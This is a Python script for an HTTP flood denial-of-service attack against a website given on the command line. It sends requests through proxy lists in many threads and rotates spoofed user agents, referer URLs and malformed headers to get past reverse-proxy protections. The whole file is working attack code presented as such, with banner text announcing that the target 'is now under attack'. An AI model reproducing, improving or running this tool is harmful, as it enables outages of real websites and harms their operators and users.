import threading, socket, time
import sys, os, random, string
from urllib.parse import urlparse
from colorama import Fore

_ua = [
'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.2 ( .NET CLR 3.0.04506.30)',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.2 ( .NET CLR 3.0.04506.648)',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/526.9 (KHTML, like Gecko) Version/4.0dp1 Safari/526.8',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; de-LI; rv:1.9.0.16) Gecko/2009120208 Firefox/3.0.16 (.NET CLR 3.5.30729)',
'NutchCVS/0.8-dev (Nutch running at UW; http://www.nutch.org/docs/en/bot.html; sycrawl@cs.washington.edu)',
'NokiaN70-1/5.0609.2.0.1 Series60/2.8 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0',
'NokiaN73-1/3.0649.0.0.1 Series60/3.0 Profile/MIDP2.0 Configuration/CLDC-1.1',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9) Gecko/2008052906 Firefox/3.0.1pre',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.0.1) Gecko/2008070208 Firefox/3.0.0',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.0.2pre) Gecko/2008082305 Firefox/3.0.2pre',
'Mozilla/4.0(compatible; MSIE 5.0; Windows 98; DigExt)',
'msnbot/1.1 ( http://search.msn.com/msnbot.htm)',
'Opera/7.51 (Windows NT 5.1; U) [en]',
'Mozilla/4.5 [de] (Macintosh; I; PPC)',
'Mozilla/4.8 [en] (Windows NT 5.1; U)',
'Opera/5.0 (SunOS 5.8 sun4m; U) [en]',
'Mozilla/4.76 [en] (X11; U; SunOS 5.8 sun4m)',
'Mozilla/4.77 [en] (X11; I; IRIX;64 6.5 IP30)',
'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
'Mozilla/4.8 [en] (X11; U; IRIX64 6.5 IP27)',
'Mozilla/4.8 [en] (X11; U; SunOS; 5.7 sun4u)',
'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
'Nokia6100/1.0 (04.01) Profile/MIDP-1.0 Configuration/CLDC-1.0',
'Nokia6230/2.0 (04.44) Profile/MIDP-2.0 Configuration/CLDC-1.1',
'Nokia6230i/2.0 (03.80) Profile/MIDP-2.0 Configuration/CLDC-1.1',
'Nokia7250/1.0 (3.14) Profile/MIDP-1.0 Configuration/CLDC-1.0',
'Mozilla/4.0 (PDA; PalmOS/sony/model prmr/Revision:1.1.54 (en)) NetFront/3.0',
'Nokia6630/1.0 (2.3.129) SymbianOS/8.0 Series60/2.6 Profile/MIDP-2.0 Configuration/CLDC-1.1',
'Nokia6630/1.0 (2.39.15) SymbianOS/8.0 Series60/2.6 Profile/MIDP-2.0 Configuration/CLDC-1.1',
'Nokia3230/2.0 (5.0614.0) SymbianOS/7.0s Series60/2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0',
'Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620',
'Mozilla/4.0 compatible ZyBorg/1.0 (wn-14.zyborg@looksmart.net; http://www.WISEnutbot.com)',
'Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)',
'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)',
'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)',
'Mozilla/4.1 (compatible; MSIE 5.0; Symbian OS; Nokia 6600;452) Opera 6.20 [en-US]',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.0.4) Firefox/3.0.8)',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9b3) Gecko/2008020514 Opera 9.5',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.0.8) Gecko/2009032609 Firefox/3.07',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.1.4) Gecko/20091007 Firefox/3.5.4',
'Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20060702 SeaMonkey/1.5a',
'Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko',
'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1',
'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1',
'Mozilla/5.0 (Apple-iPhone7C2/1202.466; U; CPU like Mac OS X; en) AppleWebKit/420+ (KHTML, like Gecko) Version/3.0 Mobile/1A543 Safari/419.3',
'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
'Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en) AppleWebKit/534.1 (KHTML, Like Gecko) Version/6.0.0.141 Mobile Safari/534.1',
'Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+',
'Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.346 Mobile Safari/534.11+',
'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
'Mozilla/4.0 (PSP (PlayStation Portable); 2.00)',
'Opera/7.50 (Windows ME; U) [en]',
'Mozilla/4.04 [en] (WinNT; I)',
'NetSurf/1.2 (NetBSD; amd64)',
'Opera/7.50 (Windows XP; U)',
'NetBSD-ftp/20031210',
'nook browser/1.0',
'Offline Explorer/2.5'
]

_rf = [
'https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=',
'https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=',
'https://drive.google.com/viewerng/viewer?url=',
'http://www.google.com/translate?u=',
'https://developers.google.com/speed/pagespeed/insights/?url=',
'http://help.baidu.com/searchResult?keywords=',
'http://www.bing.com/search?q=',
'https://add.my.yahoo.com/rss?url=',
'https://play.google.com/store/search?q=',
'http://www.google.com/?q=',
'http://regex.info/exif.cgi?url=',
'http://anonymouse.org/cgi-bin/anon-www.cgi/',
'http://www.google.com/translate?u=',
'http://translate.google.com/translate?u=',
'http://validator.w3.org/feed/check.cgi?url=',
'http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=',
'http://validator.w3.org/check?uri=',
'http://jigsaw.w3.org/css-validator/validator?uri=',
'http://validator.w3.org/checklink?uri=',
'http://www.w3.org/RDF/Validator/ARPServlet?URI=',
'http://www.w3.org/2005/08/online_xslt/xslt?xslfile=http%3A%2F%2Fwww.w3.org%2F2002%2F08%2Fextract-semantic.xsl&xmlfile=',
'http://www.w3.org/2005/08/online_xslt/xslt?xmlfile=http://www.w3.org&xslfile=',
'http://validator.w3.org/mobile/check?docAddr=',
'http://validator.w3.org/p3p/20020128/p3p.pl?uri=',
'http://online.htmlvalidator.com/php/onlinevallite.php?url=',
'http://feedvalidator.org/check.cgi?url=',
'http://gmodules.com/ig/creator?url=',
'http://www.google.com/ig/adde?moduleurl=',
'http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=',
'http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=',
'http://host-tracker.com/check_page/?furl=',
'http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=',
'http://www.onlinewebcheck.com/check.php?url=',
'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=',
'http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=',
'http://streamitwebseries.twww.tv/proxy.php?url=',
'http://www.comicgeekspeak.com/proxy.php?url='
]

_alt = [
'Connection: close',
'Cache-Control: no-cache',
'Origin: http://www.google.com',
'Accept-Encoding: deflate, gzip;q=1.0, *;q=0.5',
'Accept: text/html, application/xhtml+xml, application/xml;q=0.9, image/webp, */*;q=0.8',
'Accept-Ranges: none',
'Warning: 110 offline/1.3.37 "disrespect = disconnect"',
'Transfer-Encoding: chunked',
'Trailer: Expires',
'Upgrade: foo/2',
'Via: 1.0 tcp, 1.1 www.google.com',
'Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=',
'X-a: b',
'Accept-Encoding: gzip, deflate, br',
'Accept-Language: en-US,en;q=0.9',
'Content-Type: application/json',
'Cookie: session_id=1234567890abcdef',
'Content-Length: 12000',
'Range:10-305',
'Connection: close'
]

_proxies = [] # format <protocol>://<ip>:<port>
_useJunk = False

def _attack(_ip, _domain, abort_event):
    global _proxies, _useJunk, _ua, _alt, _rf
    i = 0
    _ssl = False
    static = "GET {} HTTP/1.1\r\nHost: {}\r\nUser-agent:{}\r\nReferer:{}{}\r\n{}\r\n\r\n" #Connection: close
    
    while not abort_event.is_set():
        try:
            prox = _proxies[i].lower()
            # toggle SSL wrapper if HTTPS proxy-type
            if (prox.startswith('https') or prox.endswith('443')):
                _ssl = True
            
            # remove protocol
            prox = prox.split("://")[1]
            
            # extract ip:port
            _rhost, _rport = prox.split(':')
            
            # setup header
            junk = '/' + ''.join(random.choice(string.ascii_letters) for _ in range(random.randint(15, 35)))
            _h = static.format(junk, _domain, random.choice(_ua), random.choice(_rf), _domain, random.choice(_alt))
            
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            if _ssl == True:
                s = ssl.wrap_socket(s)
            s.connect((_rhost, int(_rport)))
            s.sendall(_h.encode())
            s.close()
            
            i +=1
            # reiterate through proxy list
            if i == len(_proxies):
                i = 0
                
            print(Fore.GREEN + '---> Proxy forwarded packet @ ' + _rhost + ':' + _rport)
        except (ConnectionRefusedError, TimeoutError):
            print(Fore.RED + 'Transmission failure...')
        except:
            print(Fore.YELLOW + 'Critical error encountered!')
    
def _rslv():
    # format host as complete URL
    _host = sys.argv[1].lower()
    if not (_host.startswith('http://') or _host.startswith('https://')):
        _host = 'http://' + _host
        
    # attempt hostname resolution
    try:
        _domain = urlparse(_host).netloc
        _ip = socket.gethostbyname(_domain)
        return _ip, _domain
    except:
        sys.exit('DNS resolution failed! Exiting...')
        
        
def _load():
    # https://proxyscrape.com/free-proxy-list
    print('Importing proxies! Please stand-by...\r\n')
    try:
        with open(sys.argv[4], "r") as f:
            for line in f:
                if "\n" in line:
                    # remove any carriage return/s
                    line = line.replace("\n", "")
    
                # ensure protocol is specified            
                if '://' in line.lower():
                    _proxies.append(line)         
    except KeyboardInterrupt:
        sys.exit('Aborted by user!')
    except:
        sys.exit('Error reading from proxy list! Ensure path/filename is correct...\r\n')
    
    # ensure list is not empty
    if len(_proxies) == 0:
        sys.exit('Proxy list appears empty or contains no valid proxies! Exiting...\r\n')


def main():
    os.system('clear')
    if len(sys.argv) != 7:
        sys.exit('Usage: <site> <path> <inflate query? y/n> <proxies.txt> <time> <threads>\r\n')
    
    global _useJunk
    if (sys.argv[3].lower()=='y' or sys.argv[3].lower()=='yes'):
        _useJunk = True
    else:
        _useJunk = False
    
    # import proxies from list
    _load()
    
    # resolve host to endpoint
    _ip, _domain = _rslv()

    print('''
    ██╗   ███████╗      ██████╗ ██╗   ██╗  ██████╗   ██████╗   ███████╗  ███████╗
   ██╔╝   ╚═══██╔╝     ██╔══██║ ██║ ██╔═╝ ██╔══██║  ██╔══██║  ██╔═════╝ ██╔═════╝
  ██╔╝       ██╔╝     ███████╔╝ ╚███╔╝   ███████╔╝ ███████╔╝ ███████╗  ███████╗
 ██╔╝       ██╔╝     ██╔══██╔╝  ██╔═╝   ██╔═════╝ ██╔══██╔╝  ╚═══██╔╝  ╚═══██╔╝
███████╗   ██╔╝     ███████╔╝  ██╔╝    ██╔╝      ██╔╝ ██╔╝ ███████╔╝ ███████╔╝
╚══════╝   ╚═╝      ╚══════╝   ╚═╝     ╚═╝       ╚═╝  ╚═╝  ╚══════╝  ╚══════╝
''')
    print('Evading reverse-proxy measures! Target ' + _domain + ' is now under attack! <CTRL+C> to abort...\r\n')
    
    # manage thread execution
    tasks = []
    abort_event = threading.Event()
    for _ in range(0, int(sys.argv[6])):
        t = threading.Thread(target=_attack, args=(_ip, _domain, abort_event))
        t.daemon = True
        tasks.append(t)
        t.start()
    
    # wait for duration to expire
    _quit = time.time() + int(sys.argv[5])
    try:
        while time.time() <= _quit:
            pass
    except KeyboardInterrupt:
        pass
    
    # kill active threads
    abort_event.set()
    
    for t in tasks:
        t.join()
    
    sys.exit('\r\nAttack complete!\r\n')
    
if __name__ == "__main__":
    main()
